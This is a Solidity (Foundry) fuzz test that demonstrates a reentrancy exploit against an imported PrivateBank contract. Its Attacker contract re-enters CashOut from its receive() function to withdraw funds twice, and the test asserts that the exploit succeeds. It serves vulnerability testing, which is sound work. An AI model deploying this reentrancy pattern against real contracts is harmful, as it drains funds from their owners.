
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import "../src/PrivateBank.sol";

contract TestReentrancyPrivateBank is Test {
    
    PrivateBank public _contractUnderTest;
    Log public _log;
    Attacker public _attacker;

    function setUp() public {
        _log = new Log();
        _contractUnderTest = new PrivateBank(address(_log));
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        // --- 1. Constraints & Pitfall Avoidance ---
        vm.assume(attackVal >= 1 ether);
        vm.assume(attackVal < type(uint128).max);

        // --- 2. State Configuration (Pre-Condition) ---
        // No specific state required on the victim beyond funding.

        // --- 3. Funding ---
        // Fund the Victim (so it has ETH to steal/withdraw)
        vm.deal(address(_contractUnderTest), attackVal * 10); 
        
        // Fund the Test Contract (address(this))
        // We need enough to deposit 2 * attackVal to avoid underflow in 0.8.x during the reentrancy execution
        vm.deal(address(this), attackVal * 3);

        // --- 4. Trigger Attack ---
        // We deposit 2x the attack value. This allows us to withdraw 'attackVal' twice (once normally, once via reentrancy)
        // without triggering an arithmetic underflow on the balance subtraction in Solidity 0.8.x.
        _attacker.setupAttack{value: attackVal * 2}(attackVal);
        _attacker.attack(attackVal);

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    PrivateBank public victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public attackAmount;

    constructor(address victimAddress) { 
        victim = PrivateBank(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        attackAmount = val;
        
        // Deposit funds to pass the balance check in CashOut.
        // We deposit msg.value which is set to 2 * val in the test.
        victim.Deposit{value: msg.value}();
    }

    function attack(uint256 val) public {
        // Call the vulnerable function
        victim.CashOut(val);

        // Verify Success Conditions.
        // If attackCallCount is > 1, it means we successfully re-entered the function.
        if (attackCallCount > 1) {
             exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            // Re-enter the contract using the stored Fuzz/Symbolic value.
            attackCallCount++;
            victim.CashOut(attackAmount);
        }
    }
}
